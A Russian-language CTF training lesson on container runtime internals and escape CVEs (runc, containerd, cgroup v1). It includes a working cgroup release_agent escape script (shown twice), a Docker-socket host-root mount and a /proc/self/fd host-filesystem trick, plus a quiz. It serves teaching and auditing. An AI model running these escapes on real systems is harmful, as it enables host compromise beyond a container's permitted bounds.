---
id: misc-container-runtime
title: "runc/containerd: CVE и побег из рантайма"
category: misc
parent: misc-sandbox-containers
difficulty: expert
order: 4
tags: [runc, containerd, docker, cve, escape, container]
prerequisites: [misc-sandbox-containers]
useful_for:
  - "CTF pwn/Misc категория"
  - "Аудит контейнерных платформ"
  - "Побег из контейнеров"
estimated_minutes: 30
summary: "Как устроен контейнерный рантайм (runc, containerd, OCI), известные CVE (runc exec, cgroup v1), проверка уязвимости и практические побеги."
---

Запуск контейнера — это цепочка компонентов: Docker CLI → dockerd → containerd → `containerd-shim` → **runc** (OCI-рантайм) → процесс. Каждый слой — потенциальная уязвимость. Задачи про «побег из контейнера» часто сводятся к тому, чтобы найти уязвимую версию рантайма или конфигурацию и воспользоваться известным CVE. Этот урок — про устройство и практику.

## Компоненты OCI-стека

- **OCI Image Spec** — формат образа (слои, конфиг).
- **OCI Runtime Spec** — как запускать (`config.json`: namespaces, cgroups, capabilities).
- **runc** — эталонный рантайм, создаёт namespaces и стартует процесс.
- **containerd** — демон, управляющий жизненным циклом контейнеров.
- **CRI-O** — альтернатива для Kubernetes.

`runc` читает `config.json`, вызывает `clone()` с нужными флагами, настраивает cgroups, `pivot_root` в корень образа и делает `execve`. Любая ошибка в этой цепочке — вектор побега.

## Известные CVE

| CVE | Суть | Условие |
|-----|------|---------|
| CVE-2019-5736 | runc перезапись бинаря через `/proc/self/exe` | `docker exec` в контейнер |
| CVE-2019-14271 | `docker cp` загрузка недоверенного кода в dockerd | `docker cp` |
| CVE-2020-15257 | containerd-shim абстрактный unix-сокет | доступ к сокету |
| CVE-2021-30465 | runc symlink + `mount` race | монтирование |
| CVE-2022-0492 | cgroup v1 `release_agent` | CAP_SYS_ADMIN |
| CVE-2024-21626 | runc рабочий каталог утекает в `/proc/self/fd` | leaky file descriptors |

CVE-2019-5736 — самый известный: атакующий перезаписывает хост-бинарь `runc` через `/proc/self/exe`, когда `docker exec` заходит в контейнер. CVE-2024-21626 — «Leaky Vessels»: из-за незакрытого fd контейнер может получить доступ к хост-ФС через `/proc/self/fd/N`.

## CVE-2019-5736 в деталях

Механика:

1. Контейнер подменяет `/bin/sh` (или другой бинарь) на скрипт/ELF, который открывает `/proc/self/exe` — а это и есть `runc`, запущенный в контексте контейнера.
2. Когда оператор выполняет `docker exec -it <ctr> /bin/sh`, runc запускается и открывает подменённый бинарь.
3. Атакующий через `/proc/self/exe` открывает файл runc на **запись** и перезаписывает его своей полезной нагрузкой.
4. При следующем запуске runc на хосте исполняется полезная нагрузка — побег.

Условие: контейнер с доступом на запись к образу и оператор, выполняющий `exec`. Проверка версии:

```bash
docker version --format '{{.Server.Version}}'
runc --version
# runc version 1.0.0-rc5  ← уязвим
```

## Проверка окружения

```bash
# в каком рантайме мы
cat /proc/1/cgroup
# 0::/docker/<id>   (cgroup v2) или длинный путь (v1)
mount | grep -E 'overlay|proc'
# overlay on / type overlay ...  → контейнер

# версии
docker version 2>/dev/null
crictl version 2>/dev/null
ctr version 2>/dev/null
```

Если `docker` CLI доступен и сокет смонтирован — побег через `docker run -v /:/host`:

```bash
docker run -v /:/host --rm -it alpine chroot /host sh
```

## Побег через /proc/self/fd (Leaky Vessels)

Если внутри контейнера видно, что `cwd` указывает на `/proc/self/fd/N` (N — дескриптор каталога на хосте), можно сделать `chdir` в него и получить хост-ФС:

```bash
ls -l /proc/self/fd
# 0 -> /dev/null
# 1 -> pipe:[...]
# 3 -> / (хост-корень?)
cd /proc/self/fd/3
ls
# видим корень хоста
```

Уязвимые версии runc/containerd закрывали не все fd — отсюда утечка.

## Практика: учебный побег

Разверните намеренно уязвимую конфигурацию:

```bash
docker run --rm -it --cap-add SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```

Внутри:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /root/flag > /tmp/cgrp/x/out" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/cgrp/x/out
```

Это классический cgroup v1 `release_agent`-побег. На cgroup v2 он не работает — там ищите другие векторы.

## Частые ошибки и подводные камни

- Определять версию рантайма по клиенту `docker --version` — нужна серверная версия.
- Считать, что обновлённый Docker = обновлённый runc: они версионируются отдельно.
- Пробовать `release_agent` на cgroup v2 — механизм удалён.
- Игнорировать AppArmor/SELinux: они могут блокировать mount даже с SYS_ADMIN.
- Забывать про `no-new-privileges`: он ломает многие побеги через setuid.
- Не проверять `/proc/self/fd` — там может быть утечка хост-ФС.

## Что дальше / решение

Соберите локальную лабораторию с уязвимыми версиями runc и отработайте CVE-2019-5736 и cgroup-побег. Изучите `misc-docker-misc` и `misc-namespace-escape`. Дальше — `misc-seccomp-escape` и Kubernetes-ветка (kubelet/etcd).

## Справочная таблица

| Задача | Команда |
|--------|---------|
| Версия сервера Docker | `docker version --format '{{.Server.Version}}'` |
| Версия runc | `runc --version` |
| Cgroups | `cat /proc/1/cgroup` |
| Тип ФС | `mount | grep overlay` |
| Docker-сокет | `ls -l /var/run/docker.sock` |
| Побег через сокет | `docker run -v /:/host` |
| fd-утечка | `ls -l /proc/self/fd` |

## Дополнительная теория: OCI-спецификации и hooks

Контейнер описывается **OCI Runtime Spec** (`config.json`): process (args, env, capabilities), root (rootfs), mounts, linux (namespaces, cgroups, seccomp, apparmor). Рантайм (`runc`) читает этот файл и создаёт процесс. Важная деталь — **hooks**: `prestart`, `createRuntime`, `poststart`, `poststop` — программы, выполняемые хостом на разных этапах. `prestart`-hook выполняется **на хосте** от имени демона; если атакующий может влиять на hook (например, через OCI-хук в оркестраторе или через доступ к конфигу), это прямой побег. Некоторые CVE и misconfigurations связаны именно с hooks.

Ещё один слой — **cgroups**: рантайм настраивает лимиты и помещает процесс в cgroup. Ошибки в обработке путей cgroup (например, CVE-2022-0492) позволяют записать в `release_agent` и выполнить команду на хосте. Также важен `pivot_root`/`chroot` — как рантайм меняет корень; ошибки здесь дают доступ к хост-ФС.

## Изоляция в Kubernetes

В Kubernetes контейнеры запускает kubelet через CRI (containerd/CRI-O). Дополнительные поверхности: **kubelet API** (10250), **etcd** (2379), **service-account tokens**, **admission controllers**, **RBAC**. Побег из контейнера в кластер часто идёт через украденный service-account token (если он мощный) или через доступ к kubelet. Если контейнер запущен с `hostPath`, `hostNetwork`, `privileged` или `hostPID`, изоляция почти отсутствует. В CTF/K8s-задачах проверяйте: смонтирован ли `/var/run/docker.sock` или `containerd.sock`, есть ли token в `/var/run/secrets/kubernetes.io/serviceaccount/`, какие права у сервис-аккаунта (`kubectl auth can-i --list`).

## Разбор ошибок и отладка

Если `docker version` показывает клиент, но не сервер — сокет недоступен; ищите альтернативные сокеты (`containerd.sock`, `crio.sock`). Если `runc --version` недоступен в контейнере — версию можно узнать из образа/документации или косвенно (по поведению). Если побег «не работает» — проверьте AppArmor/SELinux (`cat /proc/self/attr/current`), `no-new-privileges` (`grep NoNewPrivs /proc/self/status`) и capabilities. Если mount запрещён — возможно, нет `CAP_SYS_ADMIN` или AppArmor блокирует. Ведите журнал: что именно запрещено (errno), это укажет на слой защиты. И помните: версии клиента и сервера могут различаться.

## Практический разбор: побег через cgroup release_agent

Условие: контейнер с `CAP_SYS_ADMIN`, cgroup v1. Шаги:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
# путь к нашему файлу на хосте
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\ncat /root/flag > /tmp/cgrp/x/out\n' > /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /tmp/cgrp/x/out
```

Логика: мы записываем в `release_agent` путь к скрипту на хосте, затем заставляем cgroup опустеть (`cgroup.procs` пуст → срабатывает `notify_on_release` → ядро хоста запускает `release_agent`). Скрипт выполняется на хосте и копирует флаг в доступное нам место. Это классический cgroup-побег, работающий только на v1 с `CAP_SYS_ADMIN`. На v2 он не сработает — там ищите другие векторы (`core_pattern`, монтирование). Если `mount -t cgroup` запрещён AppArmor — побег блокирован, смотрите `misc-namespace-escape`.

## Квиз

```quiz
- question: "Что такое runc?"
  options:
    - "Эталонный OCI-рантайм, создающий контейнер (namespaces, cgroups)"
    - "Сетевой плагин"
    - "Реестр образов"
    - "Оркестратор"
  answer: 0
  explanation: "runc читает config.json и запускает процесс."
- question: "Что эксплуатирует CVE-2019-5736?"
  options:
    - "Перезапись хостового runc через /proc/self/exe при docker exec"
    - "Переполнение буфера в ядре"
    - "SQL-инъекцию"
    - "XSS"
  answer: 0
  explanation: "Классический runc-побег."
- question: "Почему cgroup v1 `release_agent` больше не работает?"
  options:
    - "В cgroup v2 механизм release_agent удалён"
    - "Он требует Windows"
    - "Он был только в BSD"
    - "Он всегда выключен"
  answer: 0
  explanation: "В v2 другой интерфейс, release_agent отсутствует."
- question: "Что показывает `ls -l /proc/self/fd` в контексте побега?"
  options:
    - "Открытые дескрипторы, среди которых может быть утечка хост-каталога"
    - "Список пользователей"
    - "Таблицу маршрутизации"
    - "Версию ядра"
  answer: 0
  explanation: "CVE-2024-21626 — leaky file descriptors."
- question: "Как получить полный контроль над Docker-демоном из контейнера?"
  options:
    - "Через смонтированный /var/run/docker.sock"
    - "Через смену hostname"
    - "Через ping"
    - "Через смену пароля"
  answer: 0
  explanation: "Сокет даёт API демона — запуск контейнеров на хосте."
```

## Где пригодится

- **CTF:** misc/pwn — побег из контейнера.
- **Аудит:** проверка версий рантаймов, конфигураций Docker/K8s.
- **Работа:** безопасность CI/CD, обновление рантаймов.
- **Research:** разбор контейнерных CVE.
